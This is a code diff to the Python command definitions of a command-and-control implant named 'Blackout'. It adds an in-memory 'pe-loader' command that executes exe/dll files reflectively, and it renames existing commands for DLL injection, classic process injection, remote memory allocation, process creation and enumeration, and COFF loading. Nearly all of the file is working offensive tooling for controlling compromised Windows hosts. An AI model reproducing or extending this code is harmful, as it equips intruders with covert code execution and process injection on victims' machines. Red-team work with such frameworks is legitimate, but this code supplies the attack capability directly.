@@ -22,6 +22,7 @@ EXPLORER_CD  = 0x182
 EXPLORER_PWD = 0x183
 EXPLORER_CAT = 0x184
 
+CMD_REFLECTION           = 0x502
 CMD_DLLINJECTION         = 0x501
 COMMAND_SLEEP            = 0x111
 COMMAND_PPID             = 0x140
@@ -42,7 +43,7 @@ COMMAND_OUTPUT           = 0x200
 # ====================
 # ===== Commands =====
 # ====================
-class CommandCheckin( Command ):
+class CmdCheckin( Command ):
     CommandId   = BLACKOUT_CHECKIN
     Name        = "checkin"
     Description = "retrieve several informations from agent, machine ans connection"
@@ -83,9 +84,40 @@ class CommandCoffLdr( Command ):
 
         return Task.buffer
 
-class CommandProcEnum( Command ):
+class CmdReflective( Command ):
+    CommandId   = CMD_REFLECTION
+    Name        = "pe-loader"
+    Description = "execute pe (exe/dll) in memory"
+    Help        = ""
+    NeedAdmin   = False
+    Mitr = []   
+    Params = [
+        CommandParam(
+            name="path_to_pe",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="argument",
+            is_file_path=False,
+            is_optional=True
+        )
+    ]
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        buffer = b64decode( arguments[ 'path_to_pe' ] )
+
+        Task.add_int( self.CommandId )
+        Task.add_data( buffer )
+        Task.add_data( arguments[ 'argument' ] )
+
+        return Task.buffer
+
+class CmdProcEnum( Command ):
     CommandId   = COMMAND_PROCLIST
-    Name        = "process_list"
+    Name        = "process-list"
     Description = "enumerate process on the machine"
     Help        = ""
     NeedAdmin   = False
@@ -101,7 +133,7 @@ class CommandProcEnum( Command ):
     
 class CmdDllInjection( Command ):
     CommandId   = CMD_DLLINJECTION
-    Name        = "injection_dll"
+    Name        = "injection-dll"
     Description = "perform dll injection"
     Help        = ""
     NeedAdmin   = False
@@ -129,9 +161,9 @@ class CmdDllInjection( Command ):
 
         return Task.buffer
     
-class CommandMemoryAlloc( Command ):
+class CmdMemoryAlloc( Command ):
     CommandId   = COMMAND_MEMORY
-    Name        = "memory_alloc"
+    Name        = "memory-alloc"
     Description = "alloc private memory in the target process"
     Help        = ""
     NeedAdmin   = False
@@ -173,7 +205,7 @@ class CommandMemoryAlloc( Command ):
 
 class CommandClassic( Command ):
     CommandId   = COMMAND_CLASSIC
-    Name        = "injection_classic"
+    Name        = "injection-classic"
     Description = "perform classic injection"
     Help        = ""
     NeedAdmin   = False
@@ -207,7 +239,7 @@ class CommandClassic( Command ):
 
 class CmdRun( Command ):
     CommandId   = COMMAND_RUN
-    Name        = "process_create"
+    Name        = "process-create"
     Description = "create process with capabilities"
     Help        = ""
     NeedAdmin   = False
@@ -270,7 +302,7 @@ class CommandCd( Command ):
 
         return Task.buffer
 
-class CommandSleep( Command ):
+class CmdSleep( Command ):
     CommandId   = COMMAND_SLEEP
     Name        = "sleep"
     Description = "change sleep time"
@@ -353,16 +385,17 @@ class Blackout(AgentType):
     }
 
     Commands = [
+        CmdReflective(),
         CmdDllInjection(),
-        CommandCheckin(),
-        CommandMemoryAlloc(),
+        CmdCheckin(),
+        CmdMemoryAlloc(),
         CommandCoffLdr(),
-        CommandProcEnum(),
+        CmdProcEnum(),
         CommandClassic(),
         CmdRun(),
         CommandCd,
         CommandPwd(),
-        CommandSleep(),
+        CmdSleep(),
         CommandExitP(),
         CommandExitT()
     ]
